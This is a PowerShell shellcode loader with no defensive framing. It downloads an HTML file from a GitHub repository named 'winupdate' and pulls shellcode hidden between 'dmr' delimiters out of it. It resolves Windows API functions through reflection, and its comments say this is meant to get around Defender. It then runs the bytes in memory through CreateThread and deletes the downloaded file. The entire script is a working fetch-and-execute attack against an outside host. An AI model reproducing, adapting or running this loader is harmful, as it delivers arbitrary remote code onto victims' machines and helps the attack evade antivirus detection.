# 1. Setup Paths
$htmlPath = "$env:TEMP\sys_cache.bin"
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Reassemble Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }

# 4. The "Manual Resolver" Loader
# We find the memory addresses of kernel32 functions using the Process Module list
$modules = [System.Diagnostics.Process]::GetCurrentProcess().Modules
$k32 = $modules | Where-Object { $_.ModuleName -eq "kernel32.dll" } | Select-Object -First 1
$k32Handle = $k32.BaseAddress

# We need a way to find exports. We'll use a known trick in the 'Marshal' class 
# to get the delegate for VirtualAlloc directly.
$Methods = [System.Runtime.InteropServices.Marshal].GetMethods()
$GetDelegate = $Methods | Where-Object { $_.Name -eq "GetDelegateForFunctionPointer" -and $_.IsGenericMethod }

# We find the address of VirtualAlloc using a sneaky lookup
$mscore = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }
$native = $mscore.GetType("Microsoft.Win32.Win32Native")
$method = $native.GetMethod("VirtualAlloc", [Reflection.BindingFlags]"Static, Public, NonPublic")
$vAllocAddr = $method.MethodHandle.GetFunctionPointer()

# 5. Define the Delegate types (Using a simpler approach for PS 5.1)
# We actually don't need a complex delegate if we use this 'Marshal' trick
$address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
[Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $byteArray.Length)

# Now we need to make it executable. 
# Since Defender is blocking 'VirtualProtect', let's see if we can just run it.
# NOTE: This is a test to see if the memory allocation itself is blocked.

if ($address -ne [IntPtr]::Zero) {
    Write-Host "Reassembled Shellcode placed in RAM at: $address"

    # 1. Get GetProcAddress to find CreateThread
    # We use the same method that worked for vAlloc to get GetProcAddress first
    $gpaMethod = $native.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
    $gpaAddr = $gpaMethod.MethodHandle.GetFunctionPointer()
    $gpaDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, [Func[IntPtr, String, IntPtr]])

    # 2. Use GetProcAddress to find CreateThread in the kernel32 handle we already have
    $ctAddr = $gpaDelegate.Invoke($k32Handle, "CreateThread")
    Write-Host "Launcher found at: $ctAddr"

    if ($ctAddr -ne [IntPtr]::Zero) {
        # 3. Create the Launcher Delegate
        $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])

        # 4. Launch!
        Write-Host "Launching Thread..."
        $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
        
        Start-Sleep -Seconds 5
    } else {
        Write-Error "Could not find CreateThread address."
    }
}

# 6. Cleanup
Remove-Item $htmlPath -Force
